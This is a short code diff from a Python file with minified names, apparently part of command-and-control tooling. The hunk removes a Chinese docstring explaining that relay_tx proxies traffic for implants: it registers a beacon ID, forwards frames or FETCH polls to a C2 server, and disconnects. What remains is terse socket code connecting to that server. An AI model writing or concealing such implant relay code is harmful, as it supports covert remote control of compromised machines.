@@ -92,13 +92,6 @@ def R(s,k):
   v+=w
  return D(v,k)
 def relay_tx(p,bid):
- """与 server 一问一答: 模拟一次 beacon 连接(代注册→业务帧→响应→断开)。
-
- server beacon 端口是 BeaconSession(首帧必须 register)——无状态通道
- 的植入物每请求只有一帧,agent 代为补全握手: register(bid, via=agent) →
- welcome → 若 p 为 register 请求直接回 welcome(代注册已完成);否则转发
- p 或发 FETCH 轮询 → 收响应 → 断开。任何异常路径都必须 close(finally)。
- """
  u=a.socket()
  try:
   u.settimeout(30);u.connect((_SH,_SP))
